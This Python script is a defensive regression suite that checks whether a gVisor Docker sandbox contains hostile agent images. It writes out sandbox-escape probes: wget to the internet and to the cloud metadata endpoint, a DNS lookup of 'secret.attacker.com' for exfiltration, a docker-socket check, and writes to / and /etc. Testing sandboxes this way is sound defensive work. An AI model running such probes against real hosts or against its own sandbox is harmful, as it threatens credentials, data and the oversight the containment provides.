#!/usr/bin/env python3
"""scripts/escape_suite.py - prove the sandbox actually contains a hostile agent.

Builds a set of tiny agent images that each *attempt* something forbidden and
report RESULT:ESCAPED or RESULT:BLOCKED, then runs each through the real
submission pipeline (so it runs under exactly the sandbox the validator uses --
gVisor runtime, no network, read-only root, dropped caps). The suite passes
only if every escape attempt is BLOCKED.

A sandbox nobody has attacked is a sandbox nobody should trust. This is that
attack, kept as permanent regression coverage: run it after any change to the
sandbox config or the runtime.

    python scripts/escape_suite.py

Requires Docker with the runsc runtime installed (see SECURITY_LAYER.md step 1).
Run it on the isolation host, not a machine you care about.
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from secqurityVali import db
from secqurityVali.docker_ops import docker_available, remove_image
from secqurityVali.pipeline import check_submission

# Each case is a hostile agent: it attempts one forbidden action and prints
# RESULT:ESCAPED if it succeeded or RESULT:BLOCKED if the sandbox stopped it.
# Every case exits 0, so the dry run "accepts" it -- the verdict we care about
# is in the container's own output, which the pipeline captures.
CASES = [
    {
        "name": "internet-egress",
        "why": "no route to the internet (--network none)",
        "cmd": "wget -T3 -q -O- http://1.1.1.1 >/dev/null 2>&1 "
               "&& echo RESULT:ESCAPED || echo RESULT:BLOCKED",
    },
    {
        "name": "cloud-metadata",
        "why": "the cloud metadata endpoint must be unreachable (it holds VM creds)",
        "cmd": "wget -T3 -q -O- http://169.254.169.254/ >/dev/null 2>&1 "
               "&& echo RESULT:ESCAPED || echo RESULT:BLOCKED",
    },
    {
        "name": "dns-exfil",
        "why": "no DNS resolution (data can be leaked in a lookup)",
        "cmd": "nslookup secret.attacker.com >/dev/null 2>&1 "
               "&& echo RESULT:ESCAPED || echo RESULT:BLOCKED",
    },
    {
        "name": "docker-socket",
        "why": "the docker socket must not be mounted (it is root on the host)",
        "cmd": "[ -S /var/run/docker.sock ] "
               "&& echo RESULT:ESCAPED || echo RESULT:BLOCKED",
    },
    {
        "name": "write-root",
        "why": "the root filesystem is read-only (--read-only)",
        "cmd": "touch /pwned 2>/dev/null "
               "&& echo RESULT:ESCAPED || echo RESULT:BLOCKED",
    },
    {
        "name": "write-etc",
        "why": "no writing into system dirs",
        "cmd": "echo x > /etc/pwned 2>/dev/null "
               "&& echo RESULT:ESCAPED || echo RESULT:BLOCKED",
    },
]

# A benign control: does something harmless and exits. Confirms the harness
# reports a normal agent as accepted, so a BLOCKED result really means the
# sandbox acted, not that everything just fails.
CONTROL = {
    "name": "benign-control",
    "cmd": "echo RESULT:BENIGN",
}

IMAGE_PREFIX = "secval-escape-"


def build_image(name: str, cmd: str, workdir: Path) -> str:
    """Build a busybox image whose entrypoint runs `cmd`."""
    tag = IMAGE_PREFIX + name
    dockerfile = workdir / f"Dockerfile.{name}"
    # busybox has wget, nslookup and a shell built in, and is tiny. The
    # ENTRYPOINT must be valid JSON (double quotes) for Docker's exec form --
    # json.dumps guarantees that and escapes the command correctly.
    entry = json.dumps(["sh", "-c", cmd])
    dockerfile.write_text(f"FROM busybox\nENTRYPOINT {entry}\n")
    subprocess.run(
        ["docker", "build", "-q", "-f", str(dockerfile), "-t", tag, str(workdir)],
        check=True, capture_output=True, text=True,
    )
    return tag


def run_case(tag: str, workdir: Path, conn) -> tuple[str, str]:
    """Save the image and run it through the pipeline under the real sandbox.
    Returns (result_token, raw_log)."""
    tarball = workdir / (tag + ".tar")
    subprocess.run(["docker", "save", "-o", str(tarball), tag], check=True, capture_output=True)
    verdict = check_submission(tarball, f"escape:{tag}")
    log = verdict.log_excerpt or ""
    token = ""
    for line in log.splitlines():
        line = line.strip()
        if line.startswith("RESULT:"):
            token = line
            break
    return token, log


def main() -> int:
    if not docker_available():
        print("docker daemon is not reachable -- cannot run the escape suite.")
        return 2

    conn = db.connect(":memory:")
    passed = failed = 0
    built: list[str] = []

    with tempfile.TemporaryDirectory() as tmp:
        workdir = Path(tmp)

        # control first
        print("=== control ===")
        try:
            tag = build_image(CONTROL["name"], CONTROL["cmd"], workdir)
            built.append(tag)
            token, log = run_case(tag, workdir, conn)
            ok = token == "RESULT:BENIGN"
            print(f"  benign-control: {token or '(no result)'}  {'ok' if ok else 'UNEXPECTED'}")
        except subprocess.CalledProcessError as e:
            print(f"  benign-control: build/run error: {e.stderr or e}")

        print("\n=== escape attempts (every one must be BLOCKED) ===")
        for case in CASES:
            try:
                tag = build_image(case["name"], case["cmd"], workdir)
                built.append(tag)
                token, log = run_case(tag, workdir, conn)
            except subprocess.CalledProcessError as e:
                print(f"  {case['name']:<18} BUILD/RUN ERROR: {e.stderr or e}")
                failed += 1
                continue

            if token == "RESULT:BLOCKED":
                print(f"  {case['name']:<18} BLOCKED   ok   ({case['why']})")
                passed += 1
            elif token == "RESULT:ESCAPED":
                print(f"  {case['name']:<18} !! ESCAPED !!  SANDBOX FAILED: {case['why']}")
                failed += 1
            else:
                # No RESULT line: often the strongest containment -- the action
                # failed so hard nothing was printed. Report the raw log so it
                # can be judged rather than silently counted either way.
                print(f"  {case['name']:<18} no RESULT line; raw log: {log.strip()[:120]!r}")
                failed += 1

    # cleanup the images we built
    for tag in built:
        remove_image(tag)

    print(f"\nsummary: {passed} blocked, {failed} not-clean, of {len(CASES)} escape attempts")
    if failed:
        print("REVIEW REQUIRED: not every escape was cleanly blocked (see above).")
        return 1
    print("ALL ESCAPES BLOCKED.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
